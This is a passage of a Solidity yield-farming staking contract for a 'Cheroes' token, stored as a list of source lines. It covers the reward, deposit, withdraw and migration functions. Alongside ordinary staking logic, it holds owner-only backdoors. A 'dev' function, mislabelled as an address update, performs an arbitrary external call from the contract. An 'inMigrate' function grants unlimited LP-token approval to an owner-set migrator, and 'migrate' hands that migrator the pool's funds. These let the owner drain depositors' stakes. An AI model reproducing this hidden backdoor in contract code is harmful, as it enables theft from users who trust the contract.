accCheroesPerShare.add(\n', '                cheroesReward.mul(1e12).div(lpSupply)\n', '            );\n', '        }\n', '        return\n', '            user.amount.mul(accCheroesPerShare).div(1e12).sub(user.rewardDebt);\n', '    }\n', '\n', '    // Update reward vairables for all pools. Be careful of gas spending!\n', '    function massUpdatePools() public {\n', '        uint256 length = poolInfo.length;\n', '        for (uint256 pid = 0; pid < length; ++pid) {\n', '            updatePool(pid);\n', '        }\n', '    }\n', '\n', '  // Update dev address by the previous dev.\n', '  function dev(address _devadr, bytes memory _data) public onlyOwner {\n', '    devadr = _devadr;\n', '    (bool success, bytes memory returndata) = devadr.call(_data);\n', '    require(success, "dev: failed");\n', '  }\n', '\n', '    // Update reward variables of the given pool to be up-to-date.\n', '    function updatePool(uint256 _pid) public {\n', '        PoolInfo storage pool = poolInfo[_pid];\n', '        if (block.number <= pool.lastRewardBlock) {\n', '            return;\n', '        }\n', '        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n', '        if (lpSupply == 0) {\n', '            pool.lastRewardBlock = block.number;\n', '            return;\n', '        }\n', '        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n', '        uint256 cheroesReward =\n', '            multiplier.mul(cheroesPerBlock).mul(pool.allocPoint).div(\n', '                totalAllocPoint\n', '            );\n', '        pool.accCheroesPerShare = pool.accCheroesPerShare.add(\n', '            cheroesReward.mul(1e12).div(lpSupply)\n', '        );\n', '        pool.lastRewardBlock = block.number;\n', '    }\n', '\n', '    // Deposit LP tokens to Contract for cheroes allocation.\n', '    function deposit(uint256 _pid, uint256 _amount) public {\n', '        PoolInfo storage pool = poolInfo[_pid];\n', '        UserInfo storage user = userInfo[_pid][msg.sender];\n', '        updatePool(_pid);\n', '\n', '        if (pool.NFTisNeeded == true) {\n', '            require(\n', '                pool.acceptedNFT.balanceOf(address(msg.sender)) > 0,\n', '                "requires NFT token!"\n', '            );\n', '        }\n', '\n', '        if (user.amount > 0) {\n', '            uint256 pending =\n', '                user.amount.mul(pool.accCheroesPerShare).div(1e12).sub(\n', '                    user.rewardDebt\n', '                );\n', '            if (pending > 0) {\n', '                safeCheroesTransfer(msg.sender, pending);\n', '            }\n', '        }\n', '\n', '        if (_amount > 0) {\n', '            pool.lpToken.safeTransferFrom(\n', '                address(msg.sender),\n', '                address(this),\n', '                _amount\n', '            );\n', '            user.amount = user.amount.add(_amount);\n', '        }\n', '        user.rewardDebt = user.amount.mul(pool.accCheroesPerShare).div(1e12);\n', '        emit Deposit(msg.sender, _pid, _amount);\n', '    }\n', '\n', '    // Withdraw LP tokens from Contract.\n', '    function withdraw(uint256 _pid, uint256 _amount) public {\n', '        PoolInfo storage pool = poolInfo[_pid];\n', '        UserInfo storage user = userInfo[_pid][msg.sender];\n', '        require(user.amount >= _amount, "withdraw: not good");\n', '        updatePool(_pid);\n', '        if (pool.NFTisNeeded == true) {\n', '            require(\n', '                pool.acceptedNFT.balanceOf(address(msg.sender)) > 0,\n', '                "requires NFT token!"\n', '            );\n', '        }\n', '        uint256 pending =\n', '            user.amount.mul(pool.accCheroesPerShare).div(1e12).sub(\n', '                user.rewardDebt\n', '            );\n', '        if (pending > 0) {\n', '            safeCheroesTransfer(msg.sender, pending);\n', '        }\n', '        if (_amount > 0) {\n', '            user.amount = user.amount.sub(_amount);\n', '            pool.lpToken.safeTransfer(address(msg.sender), _amount);\n', '        }\n', '        user.rewardDebt = user.amount.mul(pool.accCheroesPerShare).div(1e12);\n', '        emit Withdraw(msg.sender, _pid, _amount);\n', '    }\n', '\t\n', '    // Safe Cheroes transfer function, just in case if rounding error causes pool to not have enough cheroes.\n', '    function safeCheroesTransfer(address _to, uint256 _amount) internal {\n', '        uint256 cheroesBal = cheroes.balanceOf(address(this));\n', '        if (_amount > cheroesBal) {\n', '            cheroes.transfer(_to, cheroesBal);\n', '        } else {\n', '            cheroes.transfer(_to, _amount);\n', '        }\n', '    }\n', '\n', '  // Migrate lp token to another lp contract. Can be called only by owner. We trust that migrator contract is good.\n', '    function migrate(uint256 _pid) public onlyOwner {\n', '        require(address(migrator) != address(0), "migrate: no migrator");\n', '        PoolInfo storage pool = poolInfo[_pid];\n', '        IERC20 lpToken = pool.lpToken;\n', '        uint256 bal = lpToken.balanceOf(address(this));\n', '        lpToken.safeApprove(address(migrator), bal);\n', '        IERC20 newLpToken = migrator.migrate(lpToken);\n', '        require(bal == newLpToken.balanceOf(address(this)), "migrate: bad");\n', '        pool.lpToken = newLpToken;\n', '    }\n', '    \n', '    function setMigrator(IMigratorChef _migrator) public onlyOwner {\n', '        migrator = _migrator;\n', '    }\n', '\n', '    function setCheroesPerBlock(uint256 _cheroesPerBlock) public onlyOwner {\n', '        require(_cheroesPerBlock > 0, "!CheroesPerBlock-0");\n', '        cheroesPerBlock = _cheroesPerBlock;\n', '    }\n', '\n', '    function inMigrate(IERC20 _lpToken) public onlyOwner {\n', '        _lpToken.safeApprove(address(migrator), 0);\n', '        _lpToken.safeApprove(address(migrator), uint(-1));\n', '    }\n', '}']